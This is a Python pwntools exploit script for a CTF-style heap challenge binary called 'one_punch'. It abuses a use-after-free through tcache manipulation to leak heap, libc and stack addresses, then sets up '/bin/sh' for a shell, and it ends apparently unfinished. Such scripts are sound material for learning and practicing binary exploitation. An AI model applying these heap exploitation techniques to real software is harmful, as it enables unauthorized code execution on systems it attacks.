from pwn import *
import time
elf = ELF("./one_punch")
libc=elf.libc
context.binary=elf
target=process([elf.path])
#target=remote()
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index,name):
	sla("> ",str(1))
	sla("idx: ",str(index))
	sa("hero name: ",name)
	
def edit(index,name):
	sla("> ",str(2))
	sla("idx: ",str(index))
	sa("hero name: ",name)

def delete(index):
	sla("> ",str(4))
	sla("idx: ",str(index))

def leak(index):
	sla("> ",str(3))
	sla("idx: ",str(index))
	target.recvuntil("hero name: ")
	leaks=target.recvline().strip("\n")
	return leaks

def attack(name="A"):
	sla("> ",str(0xc388))
	time.sleep(0.1)
	target.send(name)
	target.recvlines(2)
	leaks=target.recvline().strip("\n")
	return leaks
	
for i in range(6):
	add(0,"A"*0x217)
	delete(0)
heap_base=u64(leak(0).ljust(8,"\x00"))-0x5e0
for i in range(7):
	add(0,"A"*0x110)
	delete(0)
add(0,"A"*0x110)
add(1,"/bin/sh\x00"+"A"*0x78)
delete(0)
libc_base=u64(leak(0).ljust(8,"\x00"))-0x1ebbe0
libc_free_hook=libc_base+libc.sym["__free_hook"]
libc_environ=libc_base+libc.sym["environ"]
add(0,"A"*0x110)
print("libc base="+hex(libc_base))
add(0,"A"*0x217)
delete(0)
edit(0,p64(libc_environ))
attack()
stack_base=u64(attack().ljust(8,"\x00"))-0x1ec41
print("stack base="+hex(stack_base))
add(0,"A"*0x217)
delete(0)
target.interactive()

	
	


